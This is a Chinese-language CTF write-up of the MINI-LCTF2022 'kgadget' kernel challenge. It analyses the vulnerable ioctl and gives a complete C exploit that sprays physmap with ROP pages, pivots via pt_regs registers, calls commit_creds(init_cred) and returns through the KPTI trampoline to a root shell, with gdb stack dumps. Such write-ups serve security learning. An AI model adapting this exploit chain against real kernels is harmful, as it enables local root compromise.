---
title: "[MINI-LCTF2022]kgadget"
slug: mini-lctf2022-kgadget
description: "MINI-LCTF2022 kgadget 是一道 Linux 内核 pwn 题，通过内核模块中的栈溢出与 ROP 链构造提权，涉及 SMAP/SMEP 绕过与内核地址泄露。"
date: 2026-09-21
updated: 2026-10-19
author: mixt
category: linux kernel pwn
tags: [linux kernel pwn, ret2dir, 堆喷, nokaslr]
featured: false
draft: false
---
# [MINI-LCTF2022]kgadget

## 一.分析

### 1.kgadget_ioctl

```text
__int64 __fastcall kgadget_ioctl(file *__file, unsigned int cmd, unsigned __int64 param)
{
  void (__fastcall **v3)(void *, _QWORD); // rdx
  void (__fastcall *v4)(void *, _QWORD); // rbx
  void (__fastcall *v5)(void *, _QWORD); // rsi

  _fentry__(__file, cmd, param);
  if ( cmd == 114514 )
  {
    v4 = *v3;
    v5 = *v3;
    printk(&unk_370);
    printk(&unk_3A0);
    qmemcpy(
      (void *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 168),
      "arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3",
      48);
    *(_QWORD *)(((unsigned __int64)&STACK[0x1000] & 0xFFFFFFFFFFFFF000LL) - 112) = 0x3361626E74747261LL;
    printk(&unk_3F8);
    v4(&unk_3F8, v5);
    return 0;
  }
  else
  {
    printk(&unk_420);
    return -1;
  }
}
```

---

__`__fentry__`__是内核`ftrace`函数追踪的入口钩子，分析时可以忽略

> 这是唯一有用的函数

* qmemcpy的操作有些迷惑，看不太懂

```text
.text.unlikely:000000000000011C                 mov     rbx, [param]
.text.unlikely:000000000000011F kgadget_ptr = rbx                       ; void (*)(void)
.text.unlikely:000000000000011F                 mov     __file, offset unk_370
.text.unlikely:0000000000000126                 mov     cmd, kgadget_ptr
.text.unlikely:0000000000000129                 call    printk          ; PIC mode
.text.unlikely:000000000000012E                 mov     rdi, offset unk_3A0
.text.unlikely:0000000000000135                 call    printk          ; PIC mode
.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp
.text.unlikely:000000000000013E                 mov     rax, [rbp-18h]
.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8
.text.unlikely:0000000000000149                 add     rax, 1000h
.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h
.text.unlikely:0000000000000155                 lea     rdx, [rax-0A8h] #0A8h = 168
.text.unlikely:000000000000015C                 mov     [rbp-18h], rdx
.text.unlikely:0000000000000160 regs = rdx                              ; pt_regs *
.text.unlikely:0000000000000160                 mov     regs, 3361626E74747261h #arttnba3
.text.unlikely:000000000000016A                 mov     [rax-0A8h], rdx
.text.unlikely:0000000000000171                 mov     [rax-0A0h], rdx
.text.unlikely:0000000000000178                 mov     [rax-98h], rdx
.text.unlikely:000000000000017F                 mov     [rax-90h], rdx
.text.unlikely:0000000000000186                 mov     [rax-88h], rdx
.text.unlikely:000000000000018D                 mov     [rax-80h], rdx
.text.unlikely:0000000000000191                 mov     [rax-70h], rdx #70h = 112
.text.unlikely:0000000000000195                 call    printk          ; PIC mode
.text.unlikely:000000000000019A                 call    __x86_indirect_thunk_rbx ; PIC mode
.text.unlikely:000000000000019F                 xor     eax, eax
.text.unlikely:00000000000001A1                 jmp     short loc_1B3
```

逐步分析一下吧

`param=rdx`，那么`rbx=[rdx]`，最后会`call rbx`，所以只需要让`rdx`为`physmap`中用户段ROP的地址即可

`rax = rsp`，`rax += 1000h`，`nd rax, 0FFFFFFFFFFFFF000h`，`现在rax还是页对齐的栈地址`

`lead rdx, [rax-0A8h] ; mov [rbp-18h], rdx`这两步是存个地址吧

后面一堆`mov就是纯qmemcpy`的赋值操作了，`rdx`为`arttnba3`，在栈上放7个`arttnba3`。。。

它清理了`pt_regs`区域

备注：`pt_regs`是在进行系统调用切换到内核态时形成的结构体

---



### 2.kgadget_write

```text
__int64 __fastcall kgadget_write(__int64 a1, __int64 a2)
{
  _fentry__(a1, a2);
  raw_spin_lock(&spin);
  printk(&unk_440);
  pv_ops[85](&spin);
  return -14;
}
```

---

`raw_spin_lock(&spin)`获取一个自旋锁，spin是全局变量，用于保护临界区，防止多核并发访问

`pv_ops[85](&spin)`其中`pv_ops`是一个虚表，用于在虚拟化环境执行某些操作

> 这里不知道虚表里面85到底代表什么操作，初步推断是自旋锁的相关操作
>
> 经过分析可以看到这个函数没用

---



### 3.kgadget_read

```text
ssize_t __fastcall kgadget_read(file *__file, char *user_buf, size_t size, loff_t *__loff)
{
  _fentry__(__file, user_buf);
  raw_spin_lock(&spin);
  printk(&unk_440);
  pv_ops[85](&spin);
  return -14;
}
```

---

> 这个函数没用

---



### 4.kgadget_open

```text
int __fastcall kgadget_open(inode *__inode, file *__file)
{
  _fentry__(__inode, __file);
  raw_spin_lock(&spin);
  printk(&unk_6C4);
  pv_ops[85](&spin);
  return 0;
}
```

> 这个函数也没用

## 二.思路

就是在exp中用`mmap申请大量区域（堆喷）`

并整页整页的布置ROP

然后再在`physmap`区域中随便蒙一个地址(`physmap spary`)

这样很大概率就能蒙到那个`add_rsp_a0_pop_rbx_r12_r13_rbp_ret`

那么`rsp`是怎么跳到`mmap`页内执行ROP的呢？

在内核栈的最高端有一个`pt_regs结构体 `，驱动被调用时，内核栈只有一页，`rsp`与它的距离不远

利用这个`gadget`偏移到`pt_regs`内跳到`r9 = pop rsp ; ret`，`r8 = try_hit`

```text
for(;idx < (page_size/8 - 0x30);idx++){
        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
    }
```

保证了`rsp`的步长

```text
for(;idx < (page_size/8 - 0x10);idx++){
        rop[idx]=ret;
    }
```

在这里布置`ret`区域防止`rsp`掠过真`ROP链`

最后由于题目开启了`pti = on`导致手搓的`swaps ; iretq`没切`CR3`

必须用内部函数把`CR3页表`切回用户态才行

## 三.Exploit

```c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

size_t commit_creds = 0xffffffff810c92e0;
size_t init_cred =  0xffffffff82a6b700;
size_t pop_rdi = 0xffffffff8108c6f0;
size_t add_rsp_a0_pop_rbx_r12_r13_rbp_ret = 0xffffffff810737fe;
size_t pop_rsp = 0xffffffff811483d0;
size_t ret = 0xffffffff810001fc;
size_t return_to_usermode = 0xffffffff81c00fb0  + 27;
size_t iretq = 0xffffffff810002df;
size_t user_cs,user_rflags,user_sp,user_ss;
int dev_fd;
size_t page_size;    
size_t try_hit;
size_t *physmap_spray_array[16000];

void save_stats(){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
        );
}

void get_shell(){
    write(1, "entered\n", 8);
    if(getuid()){
        exit(EXIT_FAILURE);
    }
    write(1,"root!\n",6);
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}

void ConstructRopchian(size_t* rop){
    int idx = 0;
    for(;idx < (page_size/8 - 0x30);idx++){
        rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
    }
    for(;idx < (page_size/8 - 0x10);idx++){
        rop[idx]=ret;
    }
    rop[idx++]=pop_rdi;
    rop[idx++]=init_cred;
    rop[idx++]=commit_creds;
    rop[idx++]=return_to_usermode;
    rop[idx++]=*(size_t*)"Mixt";
    rop[idx++]=*(size_t*)"Mixt";
    rop[idx++]=(size_t)get_shell;
    rop[idx++]=user_cs;
    rop[idx++]=user_rflags;
    rop[idx++]=user_sp + 8;
    rop[idx++]=user_ss;
}

int main(int argc,char **argv){
    save_stats();
    dev_fd = open("/dev/kgadget",O_RDWR);
    page_size = sysconf(_SC_PAGESIZE);
    physmap_spray_array[0]=mmap(NULL,page_size,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    ConstructRopchian(physmap_spray_array[0]);
    for(int i = 1;i< 15000;i++){
        physmap_spray_array[i]=mmap(NULL,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0);
        memcpy(physmap_spray_array[i],physmap_spray_array[0],page_size);
    }
    try_hit = 0xffff888000000000 + 0x7000000;
    __asm__(
        "mov r8, try_hit;"
        "mov r9, pop_rsp;"
        "mov rax, 0x10;"
        "mov rdx, try_hit;"
        "mov rsi, 0x1bf52;"
        "mov rdi, dev_fd;"
        "syscall;"
        );
}
```

## 四.说明

### 1.pt_regs

> 值得注意的是内核栈只有一页

**`pt_regs`有着0xa8字节位于内核栈的最高地址端**

```text
struct pt_regs {
/*  偏移      字段        */
    unsigned long r15;      /* 0x00 */
    unsigned long r14;      /* 0x08 */
    unsigned long r13;      /* 0x10 */
    unsigned long r12;      /* 0x18 */
    unsigned long rbp;      /* 0x20 */
    unsigned long rbx;      /* 0x28 */
    unsigned long r11;      /* 0x30 */
    unsigned long r10;      /* 0x38 */
    unsigned long r9;       /* 0x40 */
    unsigned long r8;       /* 0x48 */
    unsigned long rax;      /* 0x50 */
    unsigned long rcx;      /* 0x58 */
    unsigned long rdx;      /* 0x60 */
    unsigned long rsi;      /* 0x68 */
    unsigned long rdi;      /* 0x70 */
    unsigned long orig_rax; /* 0x78 */
    unsigned long rip;      /* 0x80 */
    unsigned long cs;       /* 0x88 */
    unsigned long eflags;   /* 0x90 */
    unsigned long rsp;      /* 0x98 */
    unsigned long ss;       /* 0xA0 */
};

```

> 有时我们可利用`pt_regs`中的可控寄存器填充`gadget`

可控寄存器：`r15,r14,r13,r12,rbp,rbx,r10,r9,r8`

> kadget中找到pt_regs的方式` 

```text
.text.unlikely:000000000000013A                 mov     [rbp-18h], rsp
.text.unlikely:000000000000013E                 mov     rax, [rbp-18h]
.text.unlikely:0000000000000142                 mov     rdi, offset unk_3F8
.text.unlikely:0000000000000149                 add     rax, 1000h
.text.unlikely:000000000000014F                 and     rax, 0FFFFFFFFFFFFF000h
```

`rsp += 0x1000`其中0x1000是一页

之后再`rsp & 0xFFFFFFFFFFFFF000`定位到栈的最顶端

这是 kgadget 中用 gdb 查看的执行 exp 时的内核布局：

```text
pwndbg> x/40gx 0xffffc9000018ff58
0xffffc9000018ff58:	0x3361626e74747261	0x3361626e74747261
0xffffc9000018ff68:	0x3361626e74747261	0x3361626e74747261
0xffffc9000018ff78:	0x3361626e74747261	0x3361626e74747261
0xffffc9000018ff88:	0x0000000000000202	0x3361626e74747261
0xffffc9000018ff98:	0xffff888007000000	0xffffffff811483d0
0xffffc9000018ffa8:	0xffffffffffffffda	0x0000000000401c18
0xffffc9000018ffb8:	0xffff888007000000	0x000000000001bf52
0xffffc9000018ffc8:	0x0000000000000003	0x0000000000000010
0xffffc9000018ffd8:	0x0000000000401c18	0x0000000000000033
0xffffc9000018ffe8:	0x0000000000000202	0x00007ffc4872b7e0
0xffffc9000018fff8:	0x000000000000002b	Cannot access memory at address 0xffffc90000190000

```

```text
0xffffc90000190000          ← 页边界（x/40gx 显示 Cannot access，因为这是栈顶）
0xffffc9000018fff8  +0xa0   ss        = 0x2b
0xffffc9000018fff0  +0x98   rsp       = 0x7ffc4872b7e0
0xffffc9000018ffe8  +0x90   eflags    = 0x202
0xffffc9000018ffe0  +0x88   cs        = 0x33
0xffffc9000018ffd8  +0x80   rip       = 0x401c18
0xffffc9000018ffd0  +0x78   orig_rax  = 0x10（ioctl）
0xffffc9000018ffc8  +0x70   rdi       = 0x3
0xffffc9000018ffc0  +0x68   rsi       = 0x1bf52
0xffffc9000018ffb8  +0x60   rdx       = try_hit
0xffffc9000018ffb0  +0x58   rcx       = 0x401c18
0xffffc9000018ffa8  +0x50   rax       = 0xffffffffffffffda
0xffffc9000018ffa0  +0x48   r8        = 0xffffffff811483d0 ← pop_rsp
0xffffc9000018ff98  +0x40   r9        = 0xffff888007000000 ← try_hit
0xffffc9000018ff90  +0x38   r10       = "arttnba3"
0xffffc9000018ff88  +0x30   r11       = 0x202
0xffffc9000018ff80  +0x28   rbx       = "arttnba3"
0xffffc9000018ff78  +0x20   rbp       = "arttnba3"
0xffffc9000018ff70  +0x18   r12       = "arttnba3"
0xffffc9000018ff68  +0x10   r13       = "arttnba3"
0xffffc9000018ff60  +0x08   r14       = "arttnba3"
0xffffc9000018ff58  +0x00   r15       = "arttnba3"  ← pt_regs 起始
```

### 2.swapgs_restore_regs_and_return_to_usermode

```text
* pwndbg> x/30i  0xffffffff81c00fb0 
   0xffffffff81c00fb0:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81c00fb5:	pop    r15
   0xffffffff81c00fb7:	pop    r14
   0xffffffff81c00fb9:	pop    r13
   0xffffffff81c00fbb:	pop    r12
   0xffffffff81c00fbd:	pop    rbp
   0xffffffff81c00fbe:	pop    rbx
   0xffffffff81c00fbf:	pop    r11
   0xffffffff81c00fc1:	pop    r10
   0xffffffff81c00fc3:	pop    r9
   0xffffffff81c00fc5:	pop    r8
   0xffffffff81c00fc7:	pop    rax
   0xffffffff81c00fc8:	pop    rcx
   0xffffffff81c00fc9:	pop    rdx
   0xffffffff81c00fca:	pop    rsi
   0xffffffff81c00fcb:	mov    rdi,rsp
   0xffffffff81c00fce:	mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81c00fd7:	push   QWORD PTR [rdi+0x30]
   0xffffffff81c00fda:	push   QWORD PTR [rdi+0x28]
   0xffffffff81c00fdd:	push   QWORD PTR [rdi+0x20]
   0xffffffff81c00fe0:	push   QWORD PTR [rdi+0x18]
   0xffffffff81c00fe3:	push   QWORD PTR [rdi+0x10]
   0xffffffff81c00fe6:	push   QWORD PTR [rdi]
   0xffffffff81c00fe8:	push   rax
   0xffffffff81c00fe9:	xchg   ax,ax
   0xffffffff81c00feb:	mov    rdi,cr3
   0xffffffff81c00fee:	jmp    0xffffffff81c01024

---

* pwndbg> x/30i  0xffffffff81c00fb0  + 27
   0xffffffff81c00fcb:	mov    rdi,rsp
   0xffffffff81c00fce:	mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81c00fd7:	push   QWORD PTR [rdi+0x30]
   0xffffffff81c00fda:	push   QWORD PTR [rdi+0x28]
   0xffffffff81c00fdd:	push   QWORD PTR [rdi+0x20]
   0xffffffff81c00fe0:	push   QWORD PTR [rdi+0x18]
   0xffffffff81c00fe3:	push   QWORD PTR [rdi+0x10]
   0xffffffff81c00fe6:	push   QWORD PTR [rdi]
   0xffffffff81c00fe8:	push   rax
   0xffffffff81c00fe9:	xchg   ax,ax
   0xffffffff81c00feb:	mov    rdi,cr3
   0xffffffff81c00fee:	jmp    0xffffffff81c01024

   0xffffffff81c01024:	or     rdi,0x1000
   0xffffffff81c0102b:	mov    cr3,rdi          
   0xffffffff81c0102e:	pop    rax              
   0xffffffff81c0102f:	pop    rdi              
   0xffffffff81c01030:	swapgs                  
   0xffffffff81c01033:	jmp    0xffffffff81c01060 

* pwndbg> x/40i 0xffffffff81c01060
   0xffffffff81c01060:	test   BYTE PTR [rsp+0x20],0x4  
   0xffffffff81c01065:	jne    0xffffffff81c01069      
   0xffffffff81c01067:	iretq                          

```

> 在写`kadget`的时候，我尝试套用`core`的思路手搓`swapgs和iretq`到用户态函数，结果崩溃

在开了`KPTI`的情况下，内核页表和用户态页表分隔，不能直接从内核态跳到用户态 

所以需要内核中现存的函数来返回到用户页表（`CR3`）

我手写的链：`swapgs只切了GS ，iretq时CR3还是内核页表`

>用户态代码 0x40188e 只存在于用户页表里。

> 那么如何找到它的地址？

`vmlinux-to-elf vmlinux vmlinux.elf`

`nm ./vmlinux.elf |grep "swapgs_restore_regs_and_return_to_usermode`


















